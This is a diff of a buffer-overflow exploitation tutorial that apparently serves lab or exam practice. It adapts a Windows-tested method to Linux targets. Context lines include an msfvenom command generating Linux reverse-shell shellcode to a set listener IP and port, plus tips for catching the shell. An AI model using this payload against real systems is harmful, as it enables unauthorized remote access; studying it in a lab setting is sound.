@@ -157,9 +157,7 @@ So you're a cool cat, huh? Going after Linux? That's fine! Let me share some min
 
 1. If you don't want to use a Linux Debugging program, that's fine; you can use Immunity, but please let me explain.
 2. If you're attacking a Linux machine, copy the EXE that you find over to your Windows host.
-3. Perform testing with the same methodology defined above, with a few differences: 
--Use your Windows IP address within all of the scripts. The testing process isn't going to work with the Linux Machine's IP address.
--You will have to generate Linux Shellcode.
+3. Perform testing with the same methodology defined above, with a few differences: Use your Windows IP address within all of the scripts. The testing process isn't going to work with the Linux Machine's IP address.You will have to generate Linux Shellcode.
 4. Once you have shelled your Windows system, it's time to make some quick changes to shell the Linux system.
 5. Generate Linux Shellcode:
 **Command: msfvenom -p linux/x86/shell_reverse_tcp lhost=10.2.12.189 lport=4444 -f python -b '\x00'**
@@ -177,8 +175,7 @@ YOU ARE A MASTER
 1. What if the port that I connect to doesn't have any commands?
 First attempt to enumerate commands. On Linux, run the command: strings foo.exe
 This should give you a list of commands the Exe uses, if not, it's possible that the text
-that you enter is the "vulnerability" and you'll have to modify your scripts accordingly modify
-your scripts accordingly. Stay tuned for a vulnerable string version of the scripts.
+that you enter is the "vulnerability" and you'll have to modify your scripts accordingly. Stay tuned for a vulnerable string version of the scripts.
 
 2. What if everything has worked, but I cannot catch a shell?
 Review and evaluate: Are you using the correct payload type (Linux vs. Windows?) Are the IP, Port and Commands correct? Did you reverse the pointer correctly in the final script? Did you change the padding from 32 to 16 or 8? Do you have a listener setup? On the correct port? Did you try a listener on a different port? There are a ton of questions you can ask but these are baseline troubleshooting questions.
